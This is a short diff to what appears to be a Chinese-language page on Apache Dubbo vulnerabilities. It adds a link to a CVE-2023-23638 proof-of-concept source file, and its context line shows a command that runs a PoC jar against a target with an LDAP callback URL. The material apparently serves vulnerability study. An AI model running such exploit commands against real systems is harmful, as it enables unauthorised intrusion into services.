@@ -29,4 +29,4 @@ java -jar Dubbo-PoC-Spring-2.7.7.jar ip port ldap://ip:port/test
 - [谁在使用 Dubbo](https://github.com/apache/dubbo/issues/1012)
 - [谁在使用 Dubbo3](https://github.com/apache/dubbo/issues/9436)
 - https://github.com/X1r0z/CVE-2023-23638
-- 
+- https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202323638.java
